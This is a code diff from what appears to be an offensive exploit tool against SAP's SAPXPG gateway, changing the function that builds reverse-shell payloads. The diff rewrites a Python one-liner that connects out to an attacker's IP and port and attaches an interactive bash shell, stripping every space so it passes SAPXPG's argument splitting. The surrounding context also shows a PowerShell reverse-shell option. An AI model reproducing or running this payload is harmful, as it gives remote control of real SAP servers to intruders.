@@ -337,21 +337,25 @@ def _generate_payload(os_type: str, ip: str, port: int) -> dict:
             "display": f"PowerShell reverse shell → {ip}:{port}",
         }
     else:
-        # Use python3 reverse shell — more reliable than bash /dev/tcp
-        # through SXPG/GW exploit because it doesn't need shell redirections
-        # that get mangled by parameter splitting.
-        py_cmd = (
-            f"import socket,subprocess,os;"
-            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+        # SAPXPG splits PARAMS at spaces (execvp argv splitting).
+        # With EXTPROG=python3 and PARAMS="-c <code>", SAPXPG produces
+        # ["python3", "-c", "<code>"] which is correct — python3 gets
+        # -c as flag and the code as a single argument.
+        #
+        # The code MUST have ZERO spaces. Use __import__() instead of
+        # bare "import" statements, and semicolons for multi-statements.
+        py_code = (
+            f"s=__import__('socket').socket(2,1);"
             f"s.connect(('{ip}',{port}));"
-            f"os.dup2(s.fileno(),0);"
-            f"os.dup2(s.fileno(),1);"
-            f"os.dup2(s.fileno(),2);"
-            f"subprocess.call(['/bin/bash','-i'])"
+            f"__import__('os').dup2(s.fileno(),0);"
+            f"__import__('os').dup2(s.fileno(),1);"
+            f"__import__('os').dup2(s.fileno(),2);"
+            f"__import__('subprocess').call(['/bin/bash','-i'])"
         )
+        assert " " not in py_code, f"Space in payload: {py_code}"
         return {
             "command": "python3",
-            "params": f"-c {py_cmd}",
+            "params": f"-c {py_code}",
             "display": f"Python3 reverse shell → {ip}:{port}",
         }
 
